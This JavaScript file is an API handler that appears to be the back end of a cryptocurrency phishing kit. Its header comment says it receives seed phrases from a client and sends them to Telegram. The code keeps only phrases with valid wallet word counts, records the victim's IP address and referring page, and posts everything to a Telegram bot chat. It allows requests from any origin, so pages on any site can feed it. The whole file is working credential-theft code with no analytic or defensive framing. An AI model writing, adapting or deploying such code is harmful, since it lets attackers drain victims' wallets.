/**
 * TELEGRAM API - Clean rebuild
 * Receives seed phrases from client, sends to Telegram
 * Env vars: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 */

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ error: 'Missing env', hasToken: !!BOT_TOKEN, hasChat: !!CHAT_ID });
    }

    const { data } = req.body || {};
    if (!data) return res.status(400).json({ error: 'No data' });

    const phrase = (data.PHRASE || data.phrase || '').trim().toLowerCase();
    if (!phrase) return res.status(400).json({ error: 'No phrase' });

    // Validate: 12, 15, 18, 21, or 24 words
    const wordCount = phrase.split(/\s+/).filter(w => w.length > 0).length;
    if (![12, 15, 18, 21, 24].includes(wordCount)) {
      return res.status(200).json({ success: true, skipped: true });
    }

    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown';
    const referer = req.headers['referer'] || 'Unknown';
    const trafficSrc = data.trafficSource || 'Direct';

    const message = `${phrase}

IP: ${ip}
From: ${trafficSrc}
URL: ${referer}`;

    const tgResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        disable_web_page_preview: true
      })
    });

    const tgData = await tgResp.json();
    if (!tgResp.ok) return res.status(500).json({ error: 'Telegram error', details: tgData });

    return res.status(200).json({ success: true, messageId: tgData.result?.message_id });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
